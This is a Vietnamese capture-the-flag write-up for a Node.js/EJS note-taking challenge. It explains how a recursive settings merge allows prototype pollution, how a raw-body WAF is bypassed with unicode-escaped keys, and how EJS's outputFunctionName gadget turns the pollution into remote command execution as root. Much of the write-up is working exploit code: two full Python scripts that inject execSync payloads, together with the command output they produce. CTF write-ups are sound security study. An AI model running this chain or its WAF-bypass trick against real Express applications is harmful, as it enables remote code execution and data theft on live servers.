---
title: "SwiftNotes"
category: "Web"
tags: ["web", "nodejs", "prototype-pollution", "ejs", "rce", "waf-bypass", "openresty"]
solve_date: "2026-10-11T20:00:00+07:00"
language: "vi"
points: 52
---

# SwiftNotes — prototype pollution vào EJS compiler, thực thi từng child process

**Flag:** `CTF{5e038be14a277c1bf8b912e06de7d943}`  
**Service:** `http://144.217.91.111:3000`  
**Định dạng flag:** `CTF{}`

## Đề bài

> SwiftNotes — 52 điểm. SwiftNotes là một dịch vụ ghi chú nhóm nhỏ. Endpoint đồng bộ preferences nhận các cập nhật một phần từ client rồi gộp chúng vào settings đã lưu trên server.

Đề bài cung cấp `server.js` và `package.json`. Ứng dụng là dịch vụ ghi chú thuần Express + `express-session` + EJS: đăng ký, đăng nhập, tạo ghi chú và chỉnh preferences qua endpoint JSON “partial merge”. Bản triển khai live khác với handout — nó chạy sau openresty, có body filter và không chạy dưới dạng một tiến trình duy nhất.

## Phân tích

### Bề mặt ứng dụng

```text
HTTP/1.1 200 OK
Server: openresty/1.31.1.1
x-powered-by: Express
set-cookie: swiftnotes_pid=1b60f283-a431-4508-a2b5-d2a19888646b; HttpOnly; SameSite=Lax; Path=/
```

| Endpoint | Mục đích |
|---|---|
| `GET /register`, `POST /register` | Tạo tài khoản, gán `req.session.username` |
| `GET /login`, `POST /login` | Đăng nhập và tạo session |
| `GET /notes`, `POST /notes` | Liệt kê và thêm ghi chú (`requireAuth`) |
| `GET /settings` | Render preferences hiện tại |
| `POST /api/settings` | Gộp JSON body một phần vào `user.settings` |

`server.js` trong handout kết thúc ở sink:

```js
app.post('/api/settings', requireAuth, (req, res) => {
  const user = users[req.session.username];
  merge(user.settings, req.body || {});
  res.json({ ok: true, settings: user.settings });
});
```

`merge` được import bằng `require('./utils/merge')` — đây là recursive merge, mẫu thường gặp dẫn tới prototype pollution. Handout còn đặt `app.set('view cache', false)`, tức mỗi lần render đều biên dịch lại EJS template. Đây là nửa còn lại của gadget: object prototype bị pollute sẽ tới compiler ở mỗi request, thay vì chỉ lần render đầu.

### Body filter

Instance triển khai từ chối mọi request có **raw body** chứa chuỗi nguyên văn `__proto__`, kể cả khi chuỗi đó xuất hiện ở value chứ không phải key:

```text
[403] key_proto_literal    req=b'{"__proto__":{"x":1}}'
         resp='{"error":"request blocked by security policy"}\n'
[403] proto_as_VALUE       req=b'{"theme":"__proto__"}'
         resp='{"error":"request blocked by security policy"}\n'
[200] key_u005f_escaped    req=b'{"\\u005f\\u005fproto\\u005f\\u005f":{"esc":"ok"}}'
         resp='{"ok":true,"settings":{"theme":"light","notifications":true}}'
[403] dotted_path_key      req=b'{"a.b.__proto__.x":1}'
[403] trailing_space_key   req=b'{"__proto__ ":"x"}'
[403] nested_proto         req=b'{"a":{"__proto__":{"d":1}}}'
[200] control_theme_dark   req=b'{"theme":"dark"}'
```

Đây là byte filter, không phải parser. `express.json()` đưa body vào `JSON.parse`, nơi các escape `\uXXXX` **bên trong key** được giải mã trước khi `merge` xử lý. Vì vậy `\u005f\u005fproto\u005f\u005f` trở thành `__proto__` khi tới merge, dù raw bytes truyền qua mạng không chứa chuỗi bị chặn.

Cùng filter này còn chặn key gadget thứ hai của EJS — `outputFunctionName`:

```text
[200] theme='constructor'
[200] theme='prototype'
[403] theme='outputFunctionName'
[200] theme='/bin/sh'
[200] theme='__append'
[200] theme='mainModule'
```

Filter chỉ chặn tên gadget; `child_process`, `execSync`, `require`, `__append`, `mainModule` và shell metacharacter đều được cho qua. Cách bypass cũng tương tự: escape một ký tự trong key, thành `output\u0046unctionName`.

### Xác nhận pollution mà không cần dựa vào username may mắn

`POST /api/settings` trả lại `user.settings`, nhưng trang và JSON body đều đi qua `JSON.stringify`, vốn chỉ hiển thị own enumerable properties. Vì vậy, response không cho thấy pollution có thành công hay không. Oracle là `GET /`:

```js
app.get('/', (req, res) => {
  res.redirect(req.session.username ? '/notes' : '/login');
});
```

`req.session` kế thừa từ `Object.prototype`. Nếu pollution được áp dụng, request anonymous — không cần `connect.sid` — sẽ redirect tới `/notes` thay vì `/login`. Chỉ cần một sentinel, không cần account thật:

```text
[baseline] anon GET / -> (302, '/login')
[pollute username=__pp_probe__] (200, '{"ok":true,...}')
[oracle]  anon GET / -> 302 /login
```

Những lần thử đầu trả về `/login`, tưởng như chưa có pollution. Đây là false negative do process model của deployment, không phải do merge.

### Mỗi `swiftnotes_pid` có một child process riêng

Đọc `/app/router.js` qua RCE cho thấy front process tạo một **child riêng chạy `node server.js` cho mỗi player** rồi proxy request tới đó:

```js
async function spawnChild() {
  const port = allocPort();
  const proc = spawn('node', ['server.js'], {
    cwd: __dirname,
    env: { ...process.env, PORT: String(port) },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  ...
}

async function getOrCreatePlayer(cookiePid, ip) {
  if (cookiePid && players.has(cookiePid)) { ... return { pid: cookiePid, port: entry.port }; }
  if (spawnRateLimited(ip)) throw new SpawnRateLimitedError();
  if (players.size >= MAX_PLAYERS) evictLRU();
  const pid = crypto.randomUUID();
  ...
}

function parseCookiePid(header) {
  if (!header) return null;
  const m = header.match(/(?:^|;\s*)swiftnotes_pid=([0-9a-f-]{36})/);
  return m ? m[1] : null;
}
```

Mỗi request không có `swiftnotes_pid` sẽ nhận child mới cùng map `users` mới trong memory. Điều này giải thích các hiện tượng trước đó: user “biến mất”, session mất đăng nhập, và `429` từ spawn limiter theo IP (`too many requests, try again later`). Pollution chỉ tồn tại trong đúng một child, nên oracle và request kích hoạt phải cùng gắn với một pid. Chỉ gửi pid cookie, không gửi session cookie, vẫn kiểm tra được oracle trên đúng process:

```text
[*] att pid=18237544-dc5a-4938-87b1-5e2f6e80da45 sid=...
[pollute]  200
[oracle /]  302 /notes
>>> GLOBAL POLLUTION CONFIRMED on pinned instance
```

### EJS gadget

`package.json` pin `"ejs": "^3.1.0"`. EJS compile template thành function, phần thân được dựng từ options; `outputFunctionName` được chèn thành một dòng khai báo biến. Giá trị này được đọc từ options object vốn kế thừa `Object.prototype`, nên giá trị đã pollute được nối thẳng vào source sinh ra. Vì tắt view cache, lần render tiếp theo của bất kỳ view nào trong child đó sẽ compile lại và chạy payload.

Payload được tạo để dòng được chèn vẫn đúng cú pháp, đồng thời comment phần code còn lại:

```js
a=1;__append(process.mainModule.require("child_process").execSync("<cmd>").toString())//
```

`//` sẽ comment phần mà EJS nối sau khai báo.

## Lời giải

### 1. Đăng ký và lấy pid

Một request `POST /register` trả `302` và đặt cả `swiftnotes_pid` (dùng để routing) lẫn `connect.sid` (session). Pid là khóa sticky cho toàn bộ các bước sau.

### 2. Dựng body, chỉ escape các key

Serialize bình thường bằng `json.dumps` để quote trong payload được escape đúng, sau đó chỉ thay **hai key token**:

```python
ESC_PROTO = r'\u005f\u005fproto\u005f\u005f'   # -> __proto__
ESC_G     = r'output\u0046unctionName'          # -> outputFunctionName
```

Tự nối JSON bằng tay sẽ tạo `400 Bad Request` vì ký tự `"` trong payload phá cấu trúc document.

### 3. Pollute rồi kích hoạt

`POST /api/settings` trả `200 {"ok":true,...}` — filter đã được bypass. Sau đó gọi `GET /login` trên **cùng pid** để compile login template và chạy command.

### 4. Đọc flag

RCE chạy với `uid=0(root)`. Environment không có `FLAG`; entrypoint ghi flag vào `/data/flag.txt` (mode `444`, 38 byte). Lệnh `cat /data/flag.txt` đọc được flag.

## Exploit code

`exploit4.py` — full chain, chạy một lần và in raw command output vào trang:

```python
import requests, sys, time, re, json

BASE = "http://144.217.91.111:3000"
H = {"Content-Type": "application/json"}

# raw-string unicode escapes: JSON.parse decodes them, raw body has no literal token
ESC_PROTO = r'\u005f\u005fproto\u005f\u005f'          # -> __proto__
ESC_G = r'output\u0046unctionName'                     # -> outputFunctionName

cmd = sys.argv[2] if len(sys.argv) > 2 else "id; echo ENV_START; env; echo FS_START; ls -la / /app 2>&1; echo CAT_START; cat /flag* /app/flag* /flag /app/flag.txt 2>&1; echo CAT_END"
payload = 'a=1;__append(process.mainModule.require("child_process").execSync("%s").toString())//' % cmd

obj = {"__proto__": {"outputFunctionName": payload}}
txt = json.dumps(obj)
txt = txt.replace('"__proto__"', '"' + ESC_PROTO + '"')
txt = txt.replace('"outputFunctionName"', '"' + ESC_G + '"')
body = txt.encode()
print("[*] body:", body[:200], "...")
print("[*] raw has __proto__?", b"__proto__" in body, " has outputFunctionName?", b"outputFunctionName" in body)

att = requests.Session()
r = att.post(f"{BASE}/register", data={"username": "k" + sys.argv[1], "password": "pw12345"}, allow_redirects=False)
pid = att.cookies.get("swiftnotes_pid")
print("[*] register", r.status_code, "pid", pid)

rp = att.post(f"{BASE}/api/settings", data=body, headers=H)
print("[*] pollute:", rp.status_code, rp.text[:200])

for path in ["/login", "/notes"]:
    g = att if path == "/notes" else requests.Session()
    if path != "/notes" and pid:
        g.cookies.set("swiftnotes_pid", pid, domain="144.217.91.111", path="/")
    time.sleep(1)
    rr = g.get(f"{BASE}{path}", allow_redirects=False)
    fl = re.findall(r"CTF\{[^}]*\}", rr.text)
    print(f"\n===== GET {path} -> {rr.status_code} len={len(rr.text)} flag={fl}")
    print(rr.text[:3000])
```

`run_cmd.py` — runner dùng để đọc flag; marker `[[S]]`/`[[E]]` giúp tách command output khỏi HTML xung quanh:

```python
import requests, sys, time, re, json

BASE = "http://144.217.91.111:3000"
H = {"Content-Type": "application/json"}
ESC_PROTO = r'\u005f\u005fproto\u005f\u005f'
ESC_G = r'output\u0046unctionName'

def make_body(cmd):
    # run cmd, wrap with markers so we can slice the raw output out of the HTML
    payload = 'a=1;__append(process.mainModule.require("child_process").execSync("echo [[S]]; %s; echo [[E]]").toString())//' % cmd
    obj = {"__proto__": {"outputFunctionName": payload}}
    txt = json.dumps(obj).replace('"__proto__"', '"' + ESC_PROTO + '"').replace('"outputFunctionName"', '"' + ESC_G + '"')
    return txt.encode()

def run(cmd):
    att = requests.Session()
    att.post(f"{BASE}/register", data={"username": "r" + str(int(time.time()))[-6:], "password": "pw12345"}, allow_redirects=False)
    pid = att.cookies.get("swiftnotes_pid")
    rp = att.post(f"{BASE}/api/settings", data=make_body(cmd), headers=H)
    if rp.status_code != 200:
        return "POLLUTE-FAIL %s %s" % (rp.status_code, rp.text[:120])
    g = requests.Session()
    g.cookies.set("swiftnotes_pid", pid, domain="144.217.91.111", path="/")
    time.sleep(0.6)
    rr = g.get(f"{BASE}/login")
    m = re.search(r"\[\[S\]\](.*?)\[\[E\]\]", rr.text, re.S)
    return (m.group(1).strip() if m else "NO-MARKER len=%d" % len(rr.text))

cmd = sys.argv[1] if len(sys.argv) > 1 else "id; ls -la /app"
print(run(cmd))
```

## Kết quả

```text
[*] body: b'{"\\u005f\\u005fproto\\u005f\\u005f": {"output\\u0046unctionName": "a=1;__append(...' ...
[*] raw has __proto__? False  has outputFunctionName? False
[*] register 302 pid c146b89e-87e4-4abc-a3b6-0cd7049dbce6
[*] pollute: 200 {"ok":true,"settings":{"theme":"light","notifications":true}}

===== GET /login -> 200 len=3031 flag=[]
uid=0(root) gid=0(root) groups=0(root)
ENV_START
NODE_VERSION=18.20.8
HOSTNAME=8d0cb60cff79
YARN_VERSION=1.22.22
PORT=4110
HOME=/root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
outputFunctionName=a=1;__append(process.mainModule.require("child_process").execSync("id; ...
PWD=/app
NODE_ENV=production
FS_START
/:
...
-rwxrwxr-x   1 root root   97 Oct 15 01:39 entrypoint.sh
drwxr-xr-x   2 root root   60 Oct 15 01:43 data
...

/app:
total 76
drwxr-xr-x  1 root root  4096 Oct 15 01:43 .
drwxr-xr-x  1 root root  4096 Oct 15 01:43 ..
drwxr-xr-x 82 root root  4096 Oct  5 20:32 node_modules
-rw-r--r--  1 root root 34161 Oct  5 20:32 package-lock.json
-rw-rw-r--  1 root root   243 Oct  5 20:24 package.json
-rw-rw-r--  1 root root  9030 Oct 15 01:39 router.js
-rw-rw-r--  1 root root  2863 Oct 15 01:39 server.js
drwxr-xr-x  2 root root  4096 Oct 15 01:43 utils
drwxr-xr-x  2 root root  4096 Oct 15 01:43 views
CAT_START
cat: '/flag*': No such file or directory
cat: '/app/flag*': No such file or directory
cat: /flag: No such file or directory
cat: /app/flag.txt: No such file or directory
CAT_END
```

Không thấy flag trong environment hoặc `/app`, nên bước cuối là đọc file được mount tại `/data/flag.txt`:

```text
$ python run_cmd.py "cat /data/flag.txt; echo '---'; ls -la /data/flag.txt"
CTF{5e038be14a277c1bf8b912e06de7d943}
---
-r--r--r-- 1 root root 38 Oct 15 01:43 /data/flag.txt
```

## Ghi chú

- Filter dò chuỗi con trên raw body, nên cần escape ngay ở byte level: `\u005f` cho `__proto__` và `\u0046` cho `outputFunctionName`. `JSON.parse` khôi phục key thật trước khi chạy `merge`. Chỉ chặn tên gadget là chưa đủ vì cũng có thể escape key này.
- Không tự dựng JSON string bằng tay. Payload có dấu ngoặc kép; thứ tự đáng tin cậy là chạy `json.dumps` rồi `str.replace` có chọn lọc trên hai key token. Nối chuỗi thủ công đã hai lần gây `400 Bad Request`.
- Pollution tồn tại trong từng child process. Một anonymous session mới dùng cho oracle sẽ nhận `swiftnotes_pid` khác, tạo child khác và luôn báo “chưa bị pollute” — false negative này làm tốn phần lớn thời gian solve. Giữ nguyên pid và bỏ `connect.sid`; `GET /` trả `302 /notes` là bằng chứng.
- Việc `POST /api/settings` echo `settings` không chứng minh được gì vì `JSON.stringify` chỉ duyệt own properties. Hãy dùng oracle dựa trên hành vi.
- Front process giới hạn số child theo IP và thu hồi child idle; dò quá nhanh sẽ hết quota và nhận `429 too many requests, try again later`. Một session đã đăng ký, dùng lại xuyên suốt, là đủ cho toàn bộ chain.
- `view cache` được đặt rõ thành `false` trong `server.js`. Nếu không, EJS chỉ compile template một lần và pollution chỉ được nhận trên child chưa render trước đó.
- RCE chạy bằng `root` còn file flag có quyền `444 root:root`; sau khi gadget chạy không cần nâng quyền thêm.

## Tham khảo

- CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes
- EJS `outputFunctionName` như một gadget từ prototype pollution tới RCE
- Hành vi `view cache` của Express và MemoryStore của `express-session`
